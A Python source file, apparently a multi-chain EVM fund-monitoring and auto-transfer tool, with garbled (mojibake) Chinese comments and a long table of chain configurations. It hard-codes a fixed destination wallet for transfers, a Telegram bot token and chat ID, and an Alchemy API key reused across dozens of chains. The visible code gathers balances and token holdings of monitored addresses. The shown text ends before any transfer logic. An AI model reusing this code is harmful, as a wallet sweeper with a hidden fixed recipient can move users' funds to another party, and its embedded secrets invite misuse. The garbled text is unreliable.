#!/usr/bin/env python3
"""
EVMÂ§öÈìæËá™Âä®ÁõëÊéßËΩ¨Ë¥¶Â∑•ÂÖ∑
Âü∫‰∫éAlchemy APIÔºåÊîØÊåÅÊâÄÊúâEVMÂÖºÂÆπÈìæ
"""

import asyncio
import json
import logging
import os
import re
import sqlite3
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import aiosqlite
import requests
from web3 import Web3
try:
    # Â∞ùËØïÊóßÁâàÊú¨ÂØºÂÖ•
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        # Â∞ùËØïÊñ∞ÁâàÊú¨ÂØºÂÖ•
        from web3.middleware.geth_poa import geth_poa_middleware
    except ImportError:
        # Â¶ÇÊûúÈÉΩÂØºÂÖ•Â§±Ë¥•ÔºåÂàõÂª∫‰∏Ä‰∏™Á©∫ÁöÑ‰∏≠Èó¥‰ª∂ÂáΩÊï∞
        def geth_poa_middleware(w3):
            return w3
from eth_account import Account
from dotenv import load_dotenv
from colorama import init, Fore, Back, Style

# ÂàùÂßãÂåñcolorama
init(autoreset=True)

# Âä†ËΩΩÁéØÂ¢ÉÂèòÈáè
load_dotenv()

# ÈÖçÁΩÆÂ∏∏Èáè
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # Á°¨ÁºñÁ†ÅÁöÑËΩ¨Ë¥¶ÁõÆÊ†áÂú∞ÂùÄ
TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
TELEGRAM_CHAT_ID = "5963704377"

# È¢úËâ≤ËæìÂá∫ÂáΩÊï∞
def print_success(msg): 
    print(f"{Fore.GREEN}‚úÖ {msg}{Style.RESET_ALL}")

def translate_error_message(error_msg: str) -> str:
    """Â∞ÜÂ∏∏ËßÅÁöÑËã±ÊñáÈîôËØØ‰ø°ÊÅØÁøªËØë‰∏∫‰∏≠Êñá"""
    translations = {
        "insufficient funds": "‰ΩôÈ¢ù‰∏çË∂≥",
        "gas required exceeds allowance": "gasË¥πÁî®Ë∂ÖÂá∫ÈôêÂà∂",
        "transaction underpriced": "‰∫§Êòìgas‰ª∑Ê†ºËøá‰Ωé",
        "nonce too low": "nonceÂÄºËøá‰Ωé",
        "nonce too high": "nonceÂÄºËøáÈ´ò",
        "intrinsic gas too low": "ÂÜÖÂú®gasËøá‰Ωé",
        "exceeds block gas limit": "Ë∂ÖÂá∫Âå∫ÂùógasÈôêÂà∂",
        "replacement transaction underpriced": "ÊõøÊç¢‰∫§Êòìgas‰ª∑Ê†ºËøá‰Ωé",
        "already known": "‰∫§ÊòìÂ∑≤Áü•",
        "could not replace transaction": "Êó†Ê≥ïÊõøÊç¢‰∫§Êòì"
    }
    
    error_lower = error_msg.lower()
    for eng, chn in translations.items():
        if eng in error_lower:
            return f"{chn} ({error_msg})"
    
    return error_msg

def print_error(msg): 
    print(f"{Fore.RED}‚ùå {msg}{Style.RESET_ALL}")

def print_warning(msg): 
    print(f"{Fore.YELLOW}‚ö†Ô∏è  {msg}{Style.RESET_ALL}")

def print_info(msg): 
    print(f"{Fore.CYAN}‚ÑπÔ∏è  {msg}{Style.RESET_ALL}")

def print_progress(msg): 
    print(f"{Fore.BLUE}üîÑ {msg}{Style.RESET_ALL}")

def print_transfer(msg): 
    print(f"{Fore.MAGENTA}üí∏ {msg}{Style.RESET_ALL}")

def print_chain(msg): 
    print(f"{Fore.WHITE}{Back.BLUE} üîó {msg} {Style.RESET_ALL}")

def print_rpc(msg):
    print(f"{Fore.YELLOW}üåê {msg}{Style.RESET_ALL}")

def print_balance(msg):
    print(f"{Fore.GREEN}üí∞ {msg}{Style.RESET_ALL}")

def print_gas(msg):
    print(f"{Fore.CYAN}‚õΩ {msg}{Style.RESET_ALL}")

class ChainConfig:
    """ÈìæÈÖçÁΩÆÁ±ª"""
    
    # ÊîØÊåÅÁöÑÈìæÈÖçÁΩÆ - ÂåÖÂê´ÊâÄÊúâAlchemyÊîØÊåÅÁöÑEVMÈìæ
    SUPPORTED_CHAINS = {
        # ‰∏ªË¶Å‰∏ªÁΩë
        "ETH_MAINNET": {
            "chain_id": 1,
            "name": "Ethereum Mainnet",
            "rpc_url": "https://eth-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://etherscan.io"
        },
        "POLYGON_MAINNET": {
            "chain_id": 137,
            "name": "Polygon PoS",
            "rpc_url": "https://polygon-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MATIC",
            "explorer": "https://polygonscan.com"
        },
        "ARBITRUM_ONE": {
            "chain_id": 42161,
            "name": "Arbitrum One",
            "rpc_url": "https://arb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://arbiscan.io"
        },
        "OPTIMISM_MAINNET": {
            "chain_id": 10,
            "name": "OP Mainnet",
            "rpc_url": "https://opt-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://optimistic.etherscan.io"
        },
        "BASE_MAINNET": {
            "chain_id": 8453,
            "name": "Base",
            "rpc_url": "https://base-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://basescan.org"
        },
        "ARBITRUM_NOVA": {
            "chain_id": 42170,
            "name": "Arbitrum Nova",
            "rpc_url": "https://arbnova-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://nova.arbiscan.io"
        },
        "ZKSYNC_ERA": {
            "chain_id": 324,
            "name": "ZKsync Era",
            "rpc_url": "https://zksync-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.zksync.io"
        },
        "POLYGON_ZKEVM": {
            "chain_id": 1101,
            "name": "Polygon zkEVM",
            "rpc_url": "https://polygonzkevm-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://zkevm.polygonscan.com"
        },
        "AVALANCHE_C": {
            "chain_id": 43114,
            "name": "Avalanche C-Chain",
            "rpc_url": "https://avax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "AVAX",
            "explorer": "https://snowtrace.io"
        },
        "BSC_MAINNET": {
            "chain_id": 56,
            "name": "BNB Smart Chain",
            "rpc_url": "https://bnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BNB",
            "explorer": "https://bscscan.com"
        },
        "FANTOM_OPERA": {
            "chain_id": 250,
            "name": "Fantom Opera",
            "rpc_url": "https://fantom-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "FTM",
            "explorer": "https://ftmscan.com"
        },
        "BLAST": {
            "chain_id": 81457,
            "name": "Blast",
            "rpc_url": "https://blast-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://blastscan.io"
        },
        "LINEA": {
            "chain_id": 59144,
            "name": "Linea",
            "rpc_url": "https://linea-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://lineascan.build"
        },
        "MANTLE": {
            "chain_id": 5000,
            "name": "Mantle",
            "rpc_url": "https://mantle-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MNT",
            "explorer": "https://mantlescan.org"
        },
        "GNOSIS": {
            "chain_id": 100,
            "name": "Gnosis",
            "rpc_url": "https://gnosis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "xDAI",
            "explorer": "https://gnosisscan.io"
        },
        "CELO": {
            "chain_id": 42220,
            "name": "Celo",
            "rpc_url": "https://celo-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "CELO",
            "explorer": "https://celoscan.io"
        },
        "SCROLL": {
            "chain_id": 534352,
            "name": "Scroll",
            "rpc_url": "https://scroll-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://scrollscan.com"
        },
        
        # Êñ∞Â¢ûÈìæ
        "WORLD_CHAIN": {
            "chain_id": 480,
            "name": "World Chain",
            "rpc_url": "https://worldchain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://worldscan.org"
        },
        "SHAPE": {
            "chain_id": 360,
            "name": "Shape",
            "rpc_url": "https://shape-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://shapescan.xyz"
        },
        "BERACHAIN": {
            "chain_id": 80084,
            "name": "Berachain",
            "rpc_url": "https://berachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BERA",
            "explorer": "https://beratrail.io"
        },
        "UNICHAIN": {
            "chain_id": 1301,
            "name": "Unichain",
            "rpc_url": "https://unichain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://uniscan.xyz"
        },
        "ZORA": {
            "chain_id": 7777777,
            "name": "Zora",
            "rpc_url": "https://zora-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.zora.energy"
        },
        "ASTAR": {
            "chain_id": 592,
            "name": "Astar",
            "rpc_url": "https://astar-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ASTR",
            "explorer": "https://astar.subscan.io"
        },
        "ZETACHAIN": {
            "chain_id": 7000,
            "name": "ZetaChain",
            "rpc_url": "https://zetachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ZETA",
            "explorer": "https://zetachain.blockscout.com"
        },
        "RONIN": {
            "chain_id": 2020,
            "name": "Ronin",
            "rpc_url": "https://ronin-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "RON",
            "explorer": "https://app.roninchain.com"
        },
        "SETTLUS": {
            "chain_id": 5372,
            "name": "Settlus",
            "rpc_url": "https://settlus-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "SETL",
            "explorer": "https://explorer.settlus.org"
        },
        "ROOTSTOCK": {
            "chain_id": 30,
            "name": "Rootstock",
            "rpc_url": "https://rootstock-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "RBTC",
            "explorer": "https://explorer.rsk.co"
        },
        "STORY": {
            "chain_id": 1513,
            "name": "Story",
            "rpc_url": "https://story-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "IP",
            "explorer": "https://testnet.storyscan.xyz"
        },
        "HUMANITY": {
            "chain_id": 1890,
            "name": "Humanity",
            "rpc_url": "https://humanity-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.humanity.org"
        },
        "HYPERLIQUID": {
            "chain_id": 998,
            "name": "Hyperliquid",
            "rpc_url": "https://hyperliquid-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://app.hyperliquid.xyz"
        },
        "GALACTICA": {
            "chain_id": 9302,
            "name": "Galactica",
            "rpc_url": "https://galactica-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GNET",
            "explorer": "https://explorer.galactica.com"
        },
        "LENS": {
            "chain_id": 37111,
            "name": "Lens",
            "rpc_url": "https://lens-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GRASS",
            "explorer": "https://block-explorer.lens.dev"
        },
        "FRAX": {
            "chain_id": 252,
            "name": "Frax",
            "rpc_url": "https://frax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "frxETH",
            "explorer": "https://fraxscan.com"
        },
        "INK": {
            "chain_id": 57073,
            "name": "Ink",
            "rpc_url": "https://ink-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.inkonchain.com"
        },
        "BOTANIX": {
            "chain_id": 3636,
            "name": "Botanix",
            "rpc_url": "https://botanix-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BTC",
            "explorer": "https://blockscout.botanixlabs.dev"
        },
        "BOBA": {
            "chain_id": 288,
            "name": "Boba",
            "rpc_url": "https://boba-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://bobascan.com"
        },
        "SUPERSEED": {
            "chain_id": 5330,
            "name": "Superseed",
            "rpc_url": "https://superseed-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.superseed.xyz"
        },
        "FLOW_EVM": {
            "chain_id": 747,
            "name": "Flow EVM",
            "rpc_url": "https://flow-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "FLOW",
            "explorer": "https://evm.flowscan.io"
        },
        "DEGEN": {
            "chain_id": 666666666,
            "name": "Degen",
            "rpc_url": "https://degen-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "DEGEN",
            "explorer": "https://explorer.degen.tips"
        },
        "APECHAIN": {
            "chain_id": 33139,
            "name": "ApeChain",
            "rpc_url": "https://apechain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "APE",
            "explorer": "https://apechain.calderaexplorer.xyz"
        },
        "ANIME": {
            "chain_id": 11501,
            "name": "Anime",
            "rpc_url": "https://anime-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ANIME",
            "explorer": "https://animechain.ai"
        },
        "METIS": {
            "chain_id": 1088,
            "name": "Metis",
            "rpc_url": "https://metis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "METIS",
            "explorer": "https://explorer.metis.io"
        },
        "SONIC": {
            "chain_id": 146,
            "name": "Sonic",
            "rpc_url": "https://sonic-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "S",
            "explorer": "https://explorer.soniclabs.com"
        },
        "SEI": {
            "chain_id": 1329,
            "name": "Sei",
            "rpc_url": "https://sei-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "SEI",
            "explorer": "https://seitrace.com"
        },
        "OPBNB": {
            "chain_id": 204,
            "name": "opBNB",
            "rpc_url": "https://opbnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "BNB",
            "explorer": "https://opbnbscan.com"
        },
        "ABSTRACT": {
            "chain_id": 11124,
            "name": "Abstract",
            "rpc_url": "https://abstract-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.abstract.money"
        },
        "SONEIUM": {
            "chain_id": 1946,
            "name": "Soneium",
            "rpc_url": "https://soneium-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.soneium.org"
        },
        
        # ÊµãËØïÁΩë
        "ETH_SEPOLIA": {
            "chain_id": 11155111,
            "name": "Ethereum Sepolia",
            "rpc_url": "https://eth-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.etherscan.io"
        },
        "POLYGON_AMOY": {
            "chain_id": 80002,
            "name": "Polygon Amoy",
            "rpc_url": "https://polygon-amoy.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MATIC",
            "explorer": "https://amoy.polygonscan.com"
        },
        "ARBITRUM_SEPOLIA": {
            "chain_id": 421614,
            "name": "Arbitrum Sepolia",
            "rpc_url": "https://arb-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.arbiscan.io"
        },
        "OPTIMISM_SEPOLIA": {
            "chain_id": 11155420,
            "name": "Optimism Sepolia",
            "rpc_url": "https://opt-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia-optimism.etherscan.io"
        },
        "BASE_SEPOLIA": {
            "chain_id": 84532,
            "name": "Base Sepolia",
            "rpc_url": "https://base-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://sepolia.basescan.org"
        },
        "TEA_SEPOLIA": {
            "chain_id": 1337,
            "name": "Tea Sepolia",
            "rpc_url": "https://tea-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "TEA",
            "explorer": "https://testnet.teascan.org"
        },
        "GENSYN_TESTNET": {
            "chain_id": 42069,
            "name": "Gensyn Testnet",
            "rpc_url": "https://gensyn-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "GEN",
            "explorer": "https://explorer.gensyn.ai"
        },
        "RISE_TESTNET": {
            "chain_id": 1821,
            "name": "Rise Testnet",
            "rpc_url": "https://rise-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://testnet.risescan.co"
        },
        "MONAD_TESTNET": {
            "chain_id": 41454,
            "name": "Monad Testnet",
            "rpc_url": "https://monad-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "MON",
            "explorer": "https://testnet.monad.xyz"
        },
        "XMTP_SEPOLIA": {
            "chain_id": 11155111,
            "name": "XMTP Sepolia",
            "rpc_url": "https://xmtp-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "ETH",
            "explorer": "https://explorer.testnet.xmtp.network"
        },
        "CROSSFI_TESTNET": {
            "chain_id": 4157,
            "name": "CrossFi Testnet",
            "rpc_url": "https://crossfi-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "XFI",
            "explorer": "https://test.xfiscan.com"
        },
        "LUMIA_PRISM": {
            "chain_id": 1952959480,
            "name": "Lumia Prism",
            "rpc_url": "https://lumia-prism.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
            "native_token": "LUMIA",
            "explorer": "https://explorer.lumia.org"
        }
    }

class DatabaseManager:
    """Êï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ±ª"""
    
    def __init__(self, db_path: str = "monitoring.db"):
        self.db_path = db_path
        self._lock = asyncio.Lock()  # Ê∑ªÂä†ÂºÇÊ≠•ÈîÅÈò≤Ê≠¢Âπ∂ÂèëËÆøÈóÆ
    
    async def init_database(self):
        """ÂàùÂßãÂåñÊï∞ÊçÆÂ∫ì"""
        async with aiosqlite.connect(self.db_path) as db:
            # ÂàõÂª∫Â±èËîΩÈìæË°®
            await db.execute("""
                CREATE TABLE IF NOT EXISTS blocked_chains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT NOT NULL,
                    chain_name TEXT NOT NULL,
                    chain_id INTEGER NOT NULL,
                    blocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reason TEXT DEFAULT 'No transaction history',
                    UNIQUE(address, chain_id)
                )
            """)
            
            # ÂàõÂª∫ËΩ¨Ë¥¶ËÆ∞ÂΩïË°®
            await db.execute("""
                CREATE TABLE IF NOT EXISTS transfers (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT NOT NULL,
                    chain_name TEXT NOT NULL,
                    chain_id INTEGER NOT NULL,
                    amount TEXT NOT NULL,
                    recipient TEXT NOT NULL,
                    tx_hash TEXT,
                    gas_used TEXT,
                    gas_price TEXT,
                    status TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    error_message TEXT
                )
            """)
            
            # ÂàõÂª∫Êó•ÂøóË°®
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    level TEXT NOT NULL,
                    message TEXT NOT NULL,
                    address TEXT,
                    chain_name TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # ÂàõÂª∫ÈÖçÁΩÆË°®
            await db.execute("""
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            await db.commit()
    
    async def is_chain_blocked(self, address: str, chain_id: int) -> bool:
        """Ê£ÄÊü•ÈìæÊòØÂê¶Ë¢´Â±èËîΩ"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                cursor = await db.execute(
                    "SELECT 1 FROM blocked_chains WHERE address = ? AND chain_id = ?",
                    (address, chain_id)
                )
                result = await cursor.fetchone()
                return result is not None
    
    async def block_chain(self, address: str, chain_name: str, chain_id: int, reason: str = "No transaction history"):
        """Â±èËîΩÈìæ"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """INSERT OR IGNORE INTO blocked_chains 
                       (address, chain_name, chain_id, reason) VALUES (?, ?, ?, ?)""",
                    (address, chain_name, chain_id, reason)
                )
                await db.commit()
    
    async def log_transfer(self, address: str, chain_name: str, chain_id: int, 
                          amount: str, recipient: str, tx_hash: str = None, 
                          gas_used: str = None, gas_price: str = None, 
                          status: str = "pending", error_message: str = None):
        """ËÆ∞ÂΩïËΩ¨Ë¥¶"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """INSERT INTO transfers 
                       (address, chain_name, chain_id, amount, recipient, tx_hash, 
                        gas_used, gas_price, status, error_message) 
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (address, chain_name, chain_id, amount, recipient, tx_hash, 
                     gas_used, gas_price, status, error_message)
                )
                await db.commit()
    
    async def log_message(self, level: str, message: str, address: str = None, chain_name: str = None):
        """ËÆ∞ÂΩïÊó•ÂøóÊ∂àÊÅØ"""
        async with self._lock:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "INSERT INTO logs (level, message, address, chain_name) VALUES (?, ?, ?, ?)",
                    (level, message, address, chain_name)
                )
                await db.commit()
    
    async def get_blocked_chains(self, address: str = None) -> List[Dict]:
        """Ëé∑ÂèñÂ±èËîΩÈìæÂàóË°®"""
        async with aiosqlite.connect(self.db_path) as db:
            if address:
                cursor = await db.execute(
                    "SELECT * FROM blocked_chains WHERE address = ? ORDER BY blocked_at DESC",
                    (address,)
                )
            else:
                cursor = await db.execute(
                    "SELECT * FROM blocked_chains ORDER BY blocked_at DESC"
                )
            
            rows = await cursor.fetchall()
            columns = [description[0] for description in cursor.description]
            return [dict(zip(columns, row)) for row in rows]
    
    async def get_transfer_history(self, address: str = None, limit: int = 100) -> List[Dict]:
        """Ëé∑ÂèñËΩ¨Ë¥¶ÂéÜÂè≤"""
        async with aiosqlite.connect(self.db_path) as db:
            if address:
                cursor = await db.execute(
                    "SELECT * FROM transfers WHERE address = ? ORDER BY created_at DESC LIMIT ?",
                    (address, limit)
                )
            else:
                cursor = await db.execute(
                    "SELECT * FROM transfers ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            
            rows = await cursor.fetchall()
            columns = [description[0] for description in cursor.description]
            return [dict(zip(columns, row)) for row in rows]

class AlchemyAPI:
    """Alchemy API Â∞ÅË£ÖÁ±ª"""
    
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
        })
        
        # APIÈôêÈ¢ëÊéßÂà∂ - ‰ºòÂåñÂà∞300-500 CU/s
        self.last_request_time = 0
        self.min_request_interval = 0.002  # 2msÈó¥ÈöîÔºåÁõÆÊ†á400 CU/s
    
    async def _rate_limit(self):
        """APIÈôêÈ¢ëÊéßÂà∂"""
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        if time_since_last < self.min_request_interval:
            await asyncio.sleep(self.min_request_interval - time_since_last)
        self.last_request_time = time.time()
    
    def _get_rpc_url(self, chain_config: Dict) -> str:
        """Ëé∑ÂèñRPC URL"""
        return chain_config.get('rpc_url', '').strip()
    
    async def check_asset_transfers(self, address: str, chain_config: Dict) -> Tuple[bool, int]:
        """Ê£ÄÊü•Âú∞ÂùÄÊòØÂê¶Êúâ‰∫§ÊòìÂéÜÂè≤ÔºåËøîÂõû(ÊòØÂê¶Êúâ‰∫§Êòì, ‰∫§ÊòìÊï∞Èáè)"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getAssetTransfers",
            "params": [
                {
                    "fromBlock": "0x0",
                    "toBlock": "latest",
                    "fromAddress": address,
                    "category": ["external", "erc20", "erc721", "erc1155"],
                    "maxCount": "0xa"  # Ëé∑ÂèñÊúÄÂ§ö10Êù°ËÆ∞ÂΩïÊù•ÁªüËÆ°
                }
            ]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                transfers = data['result'].get('transfers', [])
                transfer_count = len(transfers)
                return transfer_count > 0, transfer_count
            
            return False, 0
        except requests.exceptions.HTTPError as http_error:
            status_code = getattr(http_error.response, 'status_code', None)
            # ÂØπ‰∫é 400/403/404ÔºåËßÜ‰∏∫ËØ•ÈìæÂú® Alchemy ‰∏ä‰∏çÂèóÊîØÊåÅÊàñÂØÜÈí•Êú™ÂºÄÈÄöÔºåËøîÂõû False ‰ª•Ëß¶ÂèëÂ±èËîΩ
            if status_code in (400, 403, 404):
                logging.debug(
                    f"{chain_config['name']} Âú® Alchemy ‰∏ä‰∏çÂèØÁî®ÊàñÊú™ÂºÄÈÄö (HTTP {status_code})ÔºåÂ∞ÜÂ±èËîΩËØ•Èìæ"
                )
                return False, 0
            # ÂÖ∂ÂÆÉHTTPÈîôËØØÔºå‰øùÂÆàÂ§ÑÁêÜ‰∏∫ÊöÇ‰∏çÂ±èËîΩ
            logging.debug(f"Ê£ÄÊü•‰∫§ÊòìÂéÜÂè≤Â§±Ë¥• {chain_config['name']} (HTTP {status_code}): {http_error}")
            return True, 0
        except Exception as e:
            # ÁΩëÁªúË∂ÖÊó∂Á≠âÊöÇÊó∂ÊÄßÈîôËØØÔºå‰∏çÂ±èËîΩ
            logging.warning(f"Ê£ÄÊü•‰∫§ÊòìÂéÜÂè≤Â§±Ë¥• {chain_config['name']}: {e}")
            return True, 0  # ÁΩëÁªúÈîôËØØÊó∂ÂÅáËÆæÊúâ‰∫§ÊòìÂéÜÂè≤ÔºåÈÅøÂÖçËØØÂ±èËîΩ
    
    async def get_balance(self, address: str, chain_config: Dict) -> float:
        """Ëé∑ÂèñÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ù"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "params": [address, "latest"]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                balance_wei = int(data['result'], 16)
                balance_eth = Web3.from_wei(balance_wei, 'ether')
                return float(balance_eth)
            
            return 0.0
        except Exception as e:
            logging.error(f"Ëé∑Âèñ‰ΩôÈ¢ùÂ§±Ë¥• {chain_config['name']}: {e}")
            return 0.0
    
    async def get_all_token_balances(self, address: str, chain_config: Dict) -> Dict[str, Dict]:
        """Ëé∑ÂèñÂú∞ÂùÄÁöÑÊâÄÊúâ‰ª£Â∏Å‰ΩôÈ¢ùÔºàÂéüÁîü‰ª£Â∏Å+ERC-20Ôºâ"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        # ‰ΩøÁî®AlchemyÁöÑgetTokenBalances APIËé∑ÂèñÊâÄÊúâERC-20‰ª£Â∏Å
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenBalances",
            "params": [address]
        }
        
        all_balances = {}
        
        try:
            # Ëé∑ÂèñÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ù
            native_balance = await self.get_balance(address, chain_config)
            if native_balance > 0:
                all_balances['native'] = {
                    'symbol': chain_config['native_token'],
                    'balance': native_balance,
                    'contract_address': None,
                    'decimals': 18,
                    'type': 'native'
                }
            
            # Ëé∑ÂèñERC-20‰ª£Â∏Å‰ΩôÈ¢ù
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data and 'tokenBalances' in data['result']:
                for token in data['result']['tokenBalances']:
                    if token['tokenBalance'] and token['tokenBalance'] != '0x0':
                        contract_address = token['contractAddress']
                        
                        # Ëé∑Âèñ‰ª£Â∏ÅÂÖÉÊï∞ÊçÆ
                        metadata = await self.get_token_metadata(contract_address, chain_config)
